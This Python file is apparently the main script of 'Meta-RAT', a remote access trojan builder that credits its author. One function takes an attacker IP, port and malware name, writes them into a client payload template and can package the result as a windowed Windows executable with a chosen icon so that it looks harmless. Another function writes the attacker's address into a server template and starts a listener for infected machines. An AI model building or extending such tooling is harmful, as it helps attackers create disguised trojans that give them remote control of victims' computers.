def main_run():


    import os
    from time import sleep
    from colorama import Fore 
    import platform
    import random
    import keyboard
    import subprocess


    #while True:
    osname = platform.uname()

    if "Windows" in osname:
        os.system('cls')
    else:
        os.system('clear')
    sleep(0.2)

    print(Fore.LIGHTCYAN_EX + '''
     __  __      _              ____      _  _____ 
    |  \/  | ___| |_ __ _      |  _ \    / \|_   _|
    | |\/| |/ _ \ __/ _` |_____| |_) |  / _ \ | |  
    | |  | |  __/ || (_| |_____|  _ <  / ___ \| |  
    |_|  |_|\___|\__\__,_|     |_| \_\/_/   \_\_|  

                                            
    Made By Taha                               v2
    Instagram : @taha.security_
    Github    : https://github.com/Taha-Security
    ''')

    sleep(0.2)

    def make():
        oss = platform.uname()
        if "Windows" in oss:
            try:
                data = str(subprocess.getoutput('ipconfig'))
                data_list = data.split(sep=" : ")
                try:
                    ip_info = data_list[23]
                    try:
                        ip_get = ip_info.split('\n')
                        ip = ip_get[0]
                        keyboard.write(ip)
                    except:
                        f = 43
                except:
                    fuckingneveruse = "never use this fucking bullshit"
            except:
                pass
        else:
            pass
        ipaddr = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Ip > ')
        port = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Port > ')
        malware_name = input(Fore.LIGHTWHITE_EX + '\n    Enter Malware Name > ')
        show_msg = input(Fore.LIGHTWHITE_EX + '\n    Leave Your Message for client (nothing : leave blank) > ')
        cover = open('payload/client.py','r').read()
        codes = cover.replace('myip',ipaddr).replace('myport',port).replace('myname',malware_name).replace('mymsgtext',show_msg)
        output = open(f'output/{malware_name}.py','w').write(codes)
        print(Fore.LIGHTGREEN_EX + '\n    Your Client File Created...\n')
        print(Fore.LIGHTGREEN_EX + '    Check output Folder\n')
        get = input('    Do You Want To Convert It In .exe ? :'+Fore.LIGHTRED_EX +' convert + C://Fakepath/icon.ico : ')

        if "convert" in get:
            os_kind = platform.uname()
            if "Windows" in os_kind:
                try:
                    icon = get.replace('convert ','')
                    os.chdir('output')
                    res_exe = subprocess.getoutput(f'pyinstaller output/{malware_name}.py --noconfirm --onefile --windowed --icon "{icon}"')
                    if "recognized" in res_exe:
                        print(Fore.LIGHTRED_EX + '\n    Please download pyinstaller !')
                    else:
                        print(Fore.LIGHTGREEN_EX + '\n    Please Check output Folder')
                    sleep(3)
                except:
                    print(Fore.RED+'We Have Problme Here')
                    sleep(3)
            else:
                print(Fore.LIGHTRED_EX + '\n We Dont have this option in Linux or Mac !')
    def listener_a():
        getport = input(Fore.LIGHTWHITE_EX + '\n    Enter Your Port : ')
        oss = platform.uname()
        if "Windows" in oss:
            try:
                data = str(subprocess.getoutput('ipconfig'))
                data_list = data.split(sep=" : ")
                try:
                    ip_info = data_list[23]
                    try:
                        ip_get = ip_info.split('\n')
                        ip = ip_get[0]
                        keyboard.write(ip)
                    except:
                        f = 43
                except:
                    fuckingneveruse = "never use this fucking bullshit"
            except:
                pass
        else:
            pass
        getip = input(Fore.LIGHTWHITE_EX+'\n    Enter Your Local Ip : ')
        scode = open('module/server.py','r').read().replace('myip',getip).replace('myport',getport)
        wcode = open('module/listener.py','w').write(scode)
        osnamme = platform.uname()

        if "Windows" in osnamme:
            os.system('python module/listener.py')
        else:
            os.system('python3 module/listener.py')

    get_option = input(Fore.LIGHTRED_EX + '    Choice [Listener/Make payload/Exit] > ')
    if get_option == 'make payload' or get_option == 'make' or get_option == 'Make payload':
        make()
    elif get_option == 'Listener' or get_option == 'listener':
        listener_a()
    elif get_option == 'Exit' or get_option == 'exit':
        exit()
